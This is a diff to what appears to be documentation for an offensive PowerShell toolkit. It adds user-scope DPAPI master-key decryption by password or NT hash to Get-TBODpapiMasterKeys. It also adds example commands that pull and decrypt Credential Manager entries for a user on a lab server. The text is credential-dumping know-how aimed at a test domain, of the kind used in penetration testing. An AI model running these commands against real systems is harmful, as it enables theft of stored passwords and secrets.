@@ -506,14 +506,18 @@ Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -
 
 #### Get-TBODpapiMasterKeys
 
-Decrypts DPAPI master keys using DPAPI_SYSTEM from LSA secrets.
-Use DpapiMachineKeyBytes/DpapiUserKeyBytes when you already have raw key bytes.
+Decrypts DPAPI master keys.
+Machine scope uses DPAPI_SYSTEM from LSA secrets, while user scope can be decrypted via user SID plus password or NT hash.
+Use DpapiMachineKeyBytes/DpapiUserKeyBytes when you already have raw DPAPI_SYSTEM key bytes.
+`UserNtlmHash` accepts either a 32-hex NT hash or an `LM:NT` string (only the NT portion is used for DPAPI).
 
 ```powershell
 Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
   Get-TBODpapiMasterKeys
 Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -DpapiMachineKey <hex> -DpapiUserKey <hex>
 Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine -ShareName C$
+Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserNtlmHash '0123456789abcdef0123456789abcdef'
 ```
 
 #### Find-TBODpapiBlobs
@@ -570,6 +574,10 @@ $keys = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Na
   Get-TBODpapiMasterKeys -Scope Machine
 Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine |
   Get-TBOCredManEntry -MasterKeys $keys
+
+$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserName 'jsmith' |
+  Get-TBOCredManEntry -MasterKeys $userKeys
 ```
 
 #### Get-TBORegAutoLogon
